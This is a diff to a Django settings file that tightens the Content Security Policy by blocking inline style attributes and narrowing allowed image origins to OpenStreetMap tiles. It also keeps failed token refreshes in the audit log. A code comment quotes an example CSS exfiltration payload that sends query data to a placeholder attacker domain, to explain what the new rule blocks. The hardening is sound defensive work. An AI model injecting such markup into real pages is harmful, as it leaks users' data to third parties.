@@ -315,17 +315,41 @@ CSP_POLICY = {
     "script-src-elem": ["'self'", *CSP_SCRIPT_SRC_EXTRA],
     "script-src-attr": ["'none'"],
 
-    # Inline styles are still allowed because Django admin, Leaflet,
-    # and some browser-generated UI styles may need them.
+    # 'unsafe-inline' is kept in style-src to cover <style> blocks used by
+    # Django admin and browser-injected UI (e.g. autofill overlays).
+    # Leaflet positions its tiles and markers via JavaScript (element.style.xxx),
+    # which is a script operation and is NOT governed by style-src at all.
+    #
+    # style-src-attr: 'none' overrides 'unsafe-inline' specifically for inline
+    # style="" attributes in HTML markup. This closes the CSS exfiltration vector
+    # (e.g. an injected <div style="background:url(https://attacker.com?q=...)">)
+    # without affecting <style> blocks or JS-set styles.
     "style-src": [
         "'self'",
         "'unsafe-inline'",
         "https://fonts.googleapis.com",
         *CSP_STYLE_SRC_EXTRA,
     ],
+    "style-src-attr": ["'none'"],
 
     "font-src": ["'self'", "data:", "https://fonts.gstatic.com"],
-    "img-src": ["'self'", "data:", "blob:", "https:", *CSP_IMG_SRC_EXTRA],
+
+    # img-src is intentionally scoped to known origins rather than the broad
+    # "https:" wildcard. Leaflet loads OSM tiles from *.tile.openstreetmap.org.
+    # Nominatim (geocoding) and the Met.no weather API do not serve images.
+    # data: and blob: are required for Leaflet's canvas/marker rendering.
+    #
+    # If you add an external image CDN in future (e.g. for user-uploaded boat
+    # photos served from S3/Cloudfront), add its origin to CSP_IMG_SRC_EXTRA
+    # in your environment config rather than widening this back to "https:".
+    "img-src": [
+        "'self'",
+        "data:",
+        "blob:",
+        "https://*.tile.openstreetmap.org",
+        "https://tile.openstreetmap.org",
+        *CSP_IMG_SRC_EXTRA,
+    ],
 
     "connect-src": [
         "'self'",
@@ -417,9 +441,13 @@ AUDIT_AUTOMATIC_API_EVENTS_ENABLED = env_bool("AUDIT_AUTOMATIC_API_EVENTS_ENABLE
 # Set to 1 if Django is behind one trusted reverse proxy like Nginx.
 AUDIT_TRUSTED_PROXY_COUNT = env_int("AUDIT_TRUSTED_PROXY_COUNT", 0)
 
+# Refresh is intentionally excluded from this list so that failures (4xx/5xx)
+# are still audited — a spike of failed refreshes from an unusual IP can indicate
+# a stolen token being replayed. Successful refreshes are suppressed in the
+# middleware itself to avoid noise. See audit/middleware.py _should_audit().
 AUDIT_SKIP_PATH_PREFIXES = env_list(
     "AUDIT_SKIP_PATH_PREFIXES",
-    "/api/users/health/,/api/users/csrf/,/api/users/refresh/",
+    "/api/users/health/,/api/users/csrf/",
 )
 
 LOGGING = {
